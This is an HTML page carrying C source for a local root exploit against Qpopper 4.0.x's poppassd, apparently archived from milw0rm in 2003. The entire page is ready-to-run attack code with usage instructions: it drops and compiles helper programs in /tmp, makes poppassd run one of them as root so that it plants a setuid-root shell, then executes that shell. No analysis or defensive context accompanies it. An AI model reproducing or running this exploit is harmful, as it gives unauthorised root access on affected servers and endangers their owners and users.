<html><head><title>Qpopper 4.0.x poppassd Local Root Exploit
</title></head><pre>/*
**
**  Title: Qpopper v4.0.x poppassd local root exploit.
**  Exploit code: 0x82-Local.Qp0ppa55d.c
**
** --
**  ./0x82-Local.Qp0ppa55d -u x82 -p mypasswd
**
**  Qpopper v4.0.x poppassd local root exploit.
**                          by Xpl017Elz
**
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/stat.h&gt;

#define BUF_SZ 0x82
#define D_POPPASS &quot;/usr/local/bin/poppassd&quot;
#define D_NAME &quot;Happy-Exploit&quot;
#define D_SHELL &quot;/tmp/x82&quot;
#define D_EXEC &quot;/tmp/x0x&quot;

int m_sh();
void banrl();
void usage(char *p_name);
struct stat ss;

void usage(char *p_name)
{
	fprintf(stdout,&quot; Usage: %s -option [argument]\n&quot;,p_name);
	fprintf(stdout,&quot;\n\t-u - Qpopper username.\n&quot;);
	fprintf(stdout,&quot;\t-p - Qpopper password.\n&quot;);
	fprintf(stdout,&quot;\t-t - Qpopper poppassd path.\n&quot;);
	fprintf(stdout,&quot;\t-h - Help information.\n\n&quot;);
	fprintf(stdout,&quot; Example&gt; %s -u x82 -p %s\n\n&quot;,p_name,D_NAME);
	exit(-1);
}

int m_sh()
{
	char d_shell[BUF_SZ]=D_SHELL;
	char sh_drop[BUF_SZ];
	FILE *fp;
	
	memset((char *)sh_drop,0,sizeof(sh_drop));
	snprintf(sh_drop,sizeof(sh_drop)-1,&quot;%s.c&quot;,d_shell);
	
	if((fp=fopen(sh_drop,&quot;w&quot;))==NULL)
	{
		perror(&quot; [-] fopen() error&quot;);
		exit(-1);
	}
	
	fprintf(fp,&quot;main() {\n&quot;);
	fprintf(fp,&quot;setreuid(0,0);\nsetregid(0,0);\n&quot;);
	fprintf(fp,&quot;setuid(0);\nsetgid(0);\n&quot;);
	fprintf(fp,&quot;system(\&quot;su -\&quot;);\n}\n&quot;);
	
	fclose(fp);

	memset((char *)sh_drop,0,sizeof(sh_drop));
	snprintf(sh_drop,sizeof(sh_drop)-1,
		&quot;gcc -o %s %s.c &gt;/dev/null 2&gt;&amp;1;&quot;
		&quot;rm -f %s.c &gt;/dev/null 2&gt;&amp;1&quot;,
		d_shell,d_shell,d_shell);
	system(sh_drop);
	
	memset((char *)d_shell,0,sizeof(d_shell));
	strncpy(d_shell,D_EXEC,sizeof(d_shell)-1);
	
	memset((char *)sh_drop,0,sizeof(sh_drop));
	snprintf(sh_drop,sizeof(sh_drop)-1,&quot;%s.c&quot;,d_shell);
	
	if((fp=fopen(sh_drop,&quot;w&quot;))==NULL)
	{
		perror(&quot; [-] fopen() error&quot;);
		exit(-1);
	}
	
	fprintf(fp,&quot;main() {\n&quot;);
	fprintf(fp,&quot;setreuid(0,0);\nsetregid(0,0);\n&quot;);
	fprintf(fp,&quot;setuid(0);\nsetgid(0);\n&quot;);
	fprintf(fp,&quot;system(\&quot;chown root: %s\&quot;);\n&quot;,D_SHELL);
	fprintf(fp,&quot;system(\&quot;chmod 6755 %s\&quot;);\n}\n&quot;,D_SHELL);
	
	fclose(fp);

	memset((char *)sh_drop,0,sizeof(sh_drop));
	snprintf(sh_drop,sizeof(sh_drop)-1,
		&quot;gcc -o %s %s.c &gt;/dev/null 2&gt;&amp;1;&quot;
		&quot;rm -f %s.c &gt;/dev/null 2&gt;&amp;1&quot;,
		d_shell,d_shell,d_shell);
	system(sh_drop);

	if((stat(D_SHELL,&amp;ss)==0)&amp;&amp;(stat(D_EXEC,&amp;ss)==0))
	{
		fprintf(stdout,&quot; [+] make code.\n&quot;);
		return(0);
	}
	else
	{
		fprintf(stderr,&quot; [-] code not found.\n&quot;);
		return(-1);
	}
}

int main(int argc, char *argv[])
{
	int whtl;
	char user_id[BUF_SZ]=D_NAME;
	char passwd[BUF_SZ]=D_NAME;
	char tg_path[BUF_SZ]=D_POPPASS;
	char df_sh[BUF_SZ]=D_SHELL;

	(void)banrl();
	
	while((whtl=getopt(argc,argv,&quot;U:u:P:p:T:t:Hh&quot;))!=-1)
	{
		extern char *optarg;
		switch(whtl)
		{
			case 'U':
			case 'u':
				memset((char *)user_id,0,sizeof(user_id));
				strncpy(user_id,optarg,sizeof(user_id)-1);
				break;
				
			case 'P':
			case 'p':
				memset((char *)passwd,0,sizeof(passwd));
				strncpy(passwd,optarg,sizeof(passwd)-1);
				break;
				
			case 'T':
			case 't':
				memset((char *)tg_path,0,sizeof(tg_path));
				strncpy(tg_path,optarg,sizeof(tg_path)-1);
				break;
				
			case 'H':
			case 'h':
				(void)usage(argv[0]);
				break;
				
			case '?':
				fprintf(stderr,&quot; Try `%s -i' for more information.\n\n&quot;,argv[0]);
				exit(-1);
				break;
		}
	}
	
	if(!strcmp(user_id,D_NAME)||!strcmp(passwd,D_NAME))
	{
		(void)usage(argv[0]);
		exit(-1);
	}
	else
	{
		char comm[1024];
		int out[2],in[2];

		if(((int)m_sh())==-1)
		{
			fprintf(stdout,&quot; [-] exploit failed.\n\n&quot;);
			exit(-1);
		}

		if(pipe(out)==-1)
		{
			perror(&quot; [-] pipe() error&quot;);
			exit(-1);
		}
		
		if(pipe(in)==-1)
		{
			perror(&quot; [-] pipe() error&quot;);
			exit(-1);
		}
		
		switch(fork())
		{
			case -1:
				perror(&quot; [-] fork() error&quot;);
				break;

			case 0:
				close(out[0]);
				close(in[1]);
				
				dup2(out[1],STDOUT_FILENO);
				dup2(in[0],STDIN_FILENO);
				
				execl(tg_path,tg_path,&quot;-s&quot;,D_EXEC,0);
				break;

			default:
				close(out[1]);
				close(in[0]);

				fprintf(stdout,&quot; [+] execute poppassd.\n&quot;);
				memset((char *)comm,0,sizeof(comm));
				read(out[0],comm,sizeof(comm)-1);
				fprintf(stdout,&quot; %s&quot;,comm);

				memset((char *)comm,0,sizeof(comm));
				snprintf(comm,sizeof(comm)-1,&quot;user %s\r\n&quot;,user_id);
				fprintf(stdout,&quot; [+] input username.\n&quot;);
				write(in[1],comm,strlen(comm));

				memset((char *)comm,0,sizeof(comm));
				read(out[0],comm,sizeof(comm)-1);
				fprintf(stdout,&quot; %s&quot;,comm);

				memset((char *)comm,0,sizeof(comm));
				snprintf(comm,sizeof(comm)-1,&quot;pass %s\r\n&quot;,passwd);
				fprintf(stdout,&quot; [+] input password.\n&quot;);
				write(in[1],comm,strlen(comm));

				memset((char *)comm,0,sizeof(comm));
				read(out[0],comm,sizeof(comm)-1);
				fprintf(stdout,&quot; %s&quot;,comm);

				memset((char *)comm,0,sizeof(comm));
				snprintf(comm,sizeof(comm)-1,&quot;newpass %s\r\n&quot;,passwd);
				fprintf(stdout,&quot; [+] input fake new password.\n&quot;);
				write(in[1],comm,strlen(comm));

				close(out[0]);
				close(in[1]);
				break;
		}

		fprintf(stdout,&quot; [+] wait, 2sec.\n&quot;);
		sleep(2);

		if((stat(D_SHELL,&amp;ss)==0)&amp;&amp;(ss.st_mode&amp;S_ISUID))
		{
			fprintf(stdout,&quot; [+] Ok, exploited successfully.\n&quot;);
			fprintf(stdout,&quot; [*] It's Rootshell !\n\n&quot;);
			unlink(D_EXEC);
			execl(D_SHELL,D_SHELL,0);
		}
		else
		{
			fprintf(stdout,&quot; [-] exploit failed.\n\n&quot;);
			exit(-1);
		}
	}
}

void banrl()
{
	fprintf(stdout,&quot;\n Qpopper v4.0.x poppassd local root exploit.\n&quot;);
	fprintf(stdout,&quot;                                by Xpl017Elz\n\n&quot;);
}



// milw0rm.com [2003-04-29]</pre></html>